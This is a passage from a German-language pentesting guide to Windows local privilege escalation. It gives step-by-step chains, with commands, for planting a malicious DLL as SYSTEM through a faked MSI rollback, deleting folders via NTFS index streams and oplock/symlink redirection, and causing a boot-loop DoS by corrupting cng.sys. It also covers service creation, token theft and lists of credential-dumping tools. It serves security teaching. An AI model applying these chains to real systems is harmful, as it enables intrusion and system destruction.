    - Die `.msi` enthält eine **benutzerdefinierte Installationsaktion (`SyncBeforeRollback`)**, die:
        - ein Ereignis signalisiert, wenn die `.rbs` erstellt wurde.
        - anschließend wartet, bevor sie fortfährt.

- Schritt 10: Schwache ACL erneut anwenden
    - Nach dem Empfang des Ereignisses „`.rbs` erstellt“:
        - Wendet Windows Installer erneut starke ACLs auf `C:\Config.Msi` an.
        - Da du aber noch ein Handle mit `WRITE_DAC` hast, kannst du die **schwachen ACLs erneut anwenden**.

> ACLs werden **nur beim Öffnen eines Handles durchgesetzt**, du kannst also weiterhin in den Ordner schreiben.

- Schritt 11: Gefälschte `.rbs` und `.rbf` ablegen
    - Überschreibe die `.rbs`-Datei mit einem **gefälschten Rollback-Skript**, das Windows anweist:
        - deine `.rbf`-Datei (eine schädliche DLL) an einem **privilegierten Speicherort** wiederherzustellen (z. B. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Lege deine gefälschte `.rbf` ab, die eine **schädliche DLL-Payload auf SYSTEM-Ebene** enthält.

- Schritt 12: Rollback auslösen
    - Signalisiere das Synchronisierungsereignis, damit der Installer fortfährt.
    - Eine **benutzerdefinierte Aktion vom Typ 19 (`ErrorOut`)** ist so konfiguriert, dass sie die Installation an einem bekannten Punkt **absichtlich fehlschlagen lässt**.
    - Dadurch beginnt das **Rollback**.

- Schritt 13: SYSTEM installiert deine DLL
    - Windows Installer:
        - liest deine schädliche `.rbs`.
        - kopiert deine `.rbf`-DLL an den Zielpfad.
    - Jetzt befindet sich deine **schädliche DLL in einem von SYSTEM geladenen Pfad**.

- Letzter Schritt: SYSTEM-Code ausführen
    - Führe eine vertrauenswürdige **automatisch erhöhte Binärdatei** (z. B. `osk.exe`) aus, die die von dir manipulierte DLL lädt.
    - **Boom**: Dein Code wird **als SYSTEM** ausgeführt.


### Von beliebigem Löschen/Verschieben/Umbenennen von Dateien zu SYSTEM-EoP

Die zentrale MSI-Rollback-Technik (die vorherige) setzt voraus, dass du einen **gesamten Ordner** (z. B. `C:\Config.Msi`) löschen kannst. Was aber, wenn deine Schwachstelle nur das **beliebige Löschen von Dateien** ermöglicht?

Du könntest **NTFS-Interna** ausnutzen: Jeder Ordner hat einen verborgenen alternativen Datenstrom namens:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Dieser Stream speichert die **Indexmetadaten** des Ordners.

Wenn du also den Stream `::$INDEX_ALLOCATION` eines Ordners **löschst**, entfernt NTFS **den gesamten Ordner** aus dem Dateisystem.

Du kannst dafür standardmäßige APIs zum Löschen von Dateien verwenden, wie:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Obwohl du eine API zum Löschen einer *Datei* aufrufst, **wird der Ordner selbst gelöscht**.

### Vom Löschen des Ordnerinhalts zu SYSTEM EoP
Was, wenn dein Primitive es dir nicht erlaubt, beliebige Dateien/Ordner zu löschen, aber **das Löschen des *Inhalts* eines vom Angreifer kontrollierten Ordners** ermöglicht?

1. Schritt 1: Einen Köderordner und eine Datei erstellen
- Erstellen: `C:\temp\folder1`
- Darin: `C:\temp\folder1\file1.txt`

2. Schritt 2: Einen **oplock** auf `file1.txt` setzen
- Der oplock **pausiert die Ausführung**, wenn ein privilegierter Prozess versucht, `file1.txt` zu löschen.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Schritt 3: SYSTEM-Prozess auslösen (z. B. `SilentCleanup`)
- Dieser Prozess durchsucht Ordner (z. B. `%TEMP%`) und versucht, deren Inhalte zu löschen.
- Wenn er `file1.txt` erreicht, **wird der oplock ausgelöst** und die Kontrolle an deinen callback übergeben.

4. Schritt 4: Im oplock callback – das Löschen umleiten

- Option A: `file1.txt` an einen anderen Ort verschieben
    - Dadurch wird `folder1` geleert, ohne den oplock zu unterbrechen.
    - `file1.txt` nicht direkt löschen – dadurch würde der oplock vorzeitig freigegeben.

- Option B: `folder1` in eine **junction** umwandeln:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Option C: Erstellen Sie einen **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Dies zielt auf den internen NTFS-Stream, in dem Ordner-Metadaten gespeichert sind — wird er gelöscht, wird der Ordner gelöscht.

5. Schritt 5: Oplock freigeben
- Der SYSTEM-Prozess läuft weiter und versucht, `file1.txt` zu löschen.
- Doch durch die Junction und den Symlink wird jetzt tatsächlich Folgendes gelöscht:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Ergebnis**: `C:\Config.Msi` wird von SYSTEM gelöscht.

### Von der Erstellung eines beliebigen Ordners zu dauerhaftem DoS

Nutze eine Primitive aus, mit der du **als SYSTEM/Admin einen beliebigen Ordner erstellen kannst** – selbst wenn **du keine Dateien schreiben** oder **schwache Berechtigungen festlegen kannst**.

Erstelle einen **Ordner** (keine Datei) mit dem Namen eines **kritischen Windows-Treibers**, z. B.:
```
C:\Windows\System32\cng.sys
```

- Dieser Pfad entspricht normalerweise dem Kernelmodustreiber `cng.sys`.
- Wenn du **ihn vorab als Ordner erstellst**, kann Windows den eigentlichen Treiber beim Booten nicht laden.
- Windows versucht dann, `cng.sys` während des Bootvorgangs zu laden.
- Es findet den Ordner, **kann den eigentlichen Treiber nicht auflösen** und **stürzt ab oder hält den Bootvorgang an**.
- Es gibt **kein Fallback** und **keine Wiederherstellung** ohne externe Eingriffe (z. B. Boot-Reparatur oder Zugriff auf den Datenträger).

### Von privilegierten Log-/Backup-Pfaden und OM-Symlinks zum Überschreiben beliebiger Dateien / Boot-DoS

Wenn ein **privilegierter Dienst** Logs/Exporte an einen Pfad schreibt, der aus einer **beschreibbaren Konfiguration** gelesen wird, kannst du diesen Pfad mit **Object Manager-Symlinks + NTFS-Mountpoints** umleiten und so den privilegierten Schreibvorgang zum Überschreiben beliebiger Dateien nutzen (auch **ohne SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Voraussetzungen**
- Die Konfiguration mit dem Zielpfad ist für den Angreifer beschreibbar (z. B. `%ProgramData%\...\.ini`).
- Möglichkeit, einen Mountpoint zu `\RPC Control` und einen OM-Datei-Symlink zu erstellen (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Ein privilegierter Vorgang, der in diesen Pfad schreibt (Log, Export, Bericht).

**Beispielkette**
1. Lies die Konfiguration aus, um das privilegierte Log-Ziel zu ermitteln, z. B. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Leite den Pfad ohne Administratorrechte um:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Warte, bis die privilegierte Komponente das Log schreibt (z. B. indem ein Admin „Test-SMS senden“ auslöst). Der Schreibvorgang landet nun in `C:\Windows\System32\cng.sys`.
4. Untersuche das überschriebene Ziel (mit einem Hex-/PE-Parser), um die Beschädigung zu bestätigen. Ein Neustart zwingt Windows, den manipulierten Treiberpfad zu laden → **Boot-Loop-DoS**. Das lässt sich auch auf jede geschützte Datei übertragen, die ein privilegierter Dienst zum Schreiben öffnet.

> `cng.sys` wird normalerweise aus `C:\Windows\System32\drivers\cng.sys` geladen. Wenn jedoch eine Kopie unter `C:\Windows\System32\cng.sys` vorhanden ist, kann Windows zuerst versuchen, diese zu laden. Damit ist sie ein zuverlässiges Ziel für beschädigte Daten.



## **Von hoher Integrität zu SYSTEM**

### **Neuer Dienst**

Wenn du bereits in einem Prozess mit hoher Integrität ausführst, kann der **Weg zu SYSTEM** einfach sein: **Erstelle einen neuen Dienst und führe ihn aus**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Achte beim Erstellen einer Service-Binary darauf, dass sie ein gültiger Service ist oder die erforderlichen Aktionen schnell ausführt, da sie nach 20 Sekunden beendet wird, wenn sie kein gültiger Service ist.

### AlwaysInstallElevated

Aus einem Prozess mit hoher Integrität kannst du versuchen, **die AlwaysInstallElevated-Registry-Einträge zu aktivieren** und eine Reverse Shell mithilfe eines _**.msi**_-Wrappers zu **installieren**.\
[Weitere Informationen zu den betreffenden Registry-Schlüsseln und zur Installation eines _.msi_-Pakets findest du hier.](#alwaysinstallelevated)

### Von hoher Integrität + SeImpersonate-Berechtigung zu System

**Den Code findest du** [**hier**](seimpersonate-from-high-to-system.md)**.**

### Von SeDebug + SeImpersonate zu vollständigen Token-Berechtigungen

Wenn du über diese Token-Berechtigungen verfügst (wahrscheinlich findest du sie in einem Prozess mit hoher Integrität), kannst du mit der SeDebug-Berechtigung **fast jeden Prozess öffnen** (keine geschützten Prozesse), das **Token** des Prozesses **kopieren** und einen **beliebigen Prozess mit diesem Token erstellen**.\
Bei dieser Technik wird normalerweise **ein beliebiger Prozess ausgewählt, der als SYSTEM mit allen Token-Berechtigungen ausgeführt wird** (_ja, es gibt SYSTEM-Prozesse ohne alle Token-Berechtigungen_).\
**Ein** [**Codebeispiel für die vorgeschlagene Technik findest du hier**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Diese Technik wird von meterpreter zur Rechteausweitung mit `getsystem` verwendet. Dabei wird **eine Pipe erstellt und anschließend ein Service erstellt oder missbraucht, um in diese Pipe zu schreiben**. Der **Server**, der die Pipe mithilfe der **`SeImpersonate`**-Berechtigung erstellt hat, kann dann das **Token des Pipe-Clients** (des Service) impersonieren und so SYSTEM-Berechtigungen erhalten.\
Wenn du [**mehr über Named Pipes erfahren möchtest, solltest du dies lesen**](#named-pipe-client-impersonation).\
Ein Beispiel dafür, [**wie du mithilfe von Named Pipes von hoher Integrität zu System wechselst, findest du hier**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Wenn es dir gelingt, eine DLL zu **hijacken**, die von einem **Prozess** mit **SYSTEM**-Berechtigungen **geladen** wird, kannst du beliebigen Code mit diesen Berechtigungen ausführen. Dll Hijacking eignet sich daher auch für diese Art der Rechteausweitung. Außerdem ist es aus einem Prozess mit hoher Integrität **viel einfacher umzusetzen**, da dieser **Schreibberechtigungen** für die Ordner hat, aus denen DLLs geladen werden.\
**Mehr über Dll Hijacking erfährst du** [**hier**](dll-hijacking/index.html)**.**

### **Von Administrator oder Network Service zu System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Von LOCAL SERVICE oder NETWORK SERVICE zu vollständigen Berechtigungen

**Lies:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Weitere Hilfe

[Statische impacket-Binaries](https://github.com/ropnop/impacket_static_binaries)

## Nützliche Tools

**Bestes Tool zur Suche nach lokalen Windows-Rechteausweitungsvektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Sucht nach Fehlkonfigurationen und sensiblen Dateien (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wird erkannt.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Sucht nach möglichen Fehlkonfigurationen und sammelt Informationen (**[**hier ansehen**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Sucht nach Fehlkonfigurationen**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrahiert gespeicherte Sitzungsinformationen aus PuTTY, WinSCP, SuperPuTTY, FileZilla und RDP. Verwende lokal die Option -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrahiert Anmeldedaten aus dem Credential Manager. Wird erkannt.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Führt einen Password Spray mit gesammelten Passwörtern über die Domäne aus**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ist ein PowerShell-Tool für ADIDNS/LLMNR/mDNS-Spoofing und Man-in-the-Middle-Angriffe.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Einfache Windows-Aufzählung zur Rechteausweitung**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (VERALTET, Watson wird empfohlen)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokale Prüfungen **(Admin-Rechte erforderlich)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Sucht nach bekannten Schwachstellen zur Rechteausweitung (muss mit VisualStudio kompiliert werden) ([**vorkompilierte Version**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Durchsucht den Host nach Fehlkonfigurationen (eher ein Tool zum Sammeln von Informationen als zur Rechteausweitung) (muss kompiliert werden) **(**[**vorkompilierte Version**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrahiert Anmeldedaten aus zahlreichen Programmen (vorkompilierte EXE auf GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Portierung von PowerUp nach C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Prüft auf Fehlkonfigurationen (vorkompilierte ausführbare Datei auf GitHub). Nicht empfohlen. Funktioniert unter Win10 nicht gut.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Prüft auf mögliche Fehlkonfigurationen (EXE aus Python). Nicht empfohlen. Funktioniert unter Win10 nicht gut.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool, das auf Grundlage dieses Beitrags erstellt wurde (benötigt accesschk nicht für die ordnungsgemäße Funktion, kann es aber verwenden).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Liest die Ausgabe von **systeminfo** und empfiehlt funktionierende Exploits (lokales Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Du musst das Projekt mit der passenden .NET-Version kompilieren ([siehe hier](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Um die auf dem Zielhost installierte .NET-Version anzuzeigen, kannst du Folgendes ausführen:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Grundlagen der Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Rechteausweitung durch Ausnutzen schwacher Ordnerberechtigungen](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation – ein Spickzettel](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop – Workshop zu lokaler Privilege Escalation unter Windows/Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 – Windows-Angriffe: AT ist das neue Schwarz (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation – Windows – Vollständiger OSCP-Leitfaden](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows – Privilege Escalation – PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Leitfaden zur Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation-Checkliste](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows-Methoden zur Privilege Escalation für Pentester](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → hMailServer-Anmeldedaten entschlüsseln → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-String-Leak + Stack-BOF → VirtualAlloc ROP (RCE) und Kernel-Token-Diebstahl](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jagd auf den Silver Fox: Katz-und-Maus-Spiel in den Schatten des Kernels](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Schwachstelle im privilegierten Dateisystem eines SCADA-Systems](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Tools zum Testen symbolischer Links – Verwendung von CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Zurück in die Vergangenheit: Symbolische Links unter Windows missbrauchen](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt-Strike-BOF-Portierung)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: Gefährliche Modulauflösung unter Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-Module: Laden aus `node_modules`-Ordnern](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – C/C++-Checklisten-Herausforderungen, gelöst](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – Funktion RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own mit Microslop: CLDFLT und DirectX-Kernel-Race-Conditions für Windows-LPE verketten](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ein I/O Ring, sie alle zu beherrschen: Eine vollständige Read/Write-Exploit-Primitive unter Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Beliebige Dateilöschungen missbrauchen, um Rechte auszuweiten, und weitere nützliche Tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – Exploit-Code für FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-Angriffe, Teil 2: CVE-2020-1013, eine 1-Day-Schwachstelle zur lokalen Privilege Escalation unter Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager und Windows Vault erkunden](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource Based Constrained Delegation: Wenn eine Image-Änderung zur Privilege Escalation führt](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – SSH-Private-Keys aus dem SSH-Agent von Windows 10 extrahieren](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Unternehmens-Update-Server in Backdoor-Fabriken verwandeln (0_o) – Teil 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – Rechteausweitung durch Löschen des Microsoft-Windows-Installer-Ordners](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec – Total Recall: Die eigenen Schritte zurück zu NT AUTHORITY\SYSTEM nachvollziehen](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
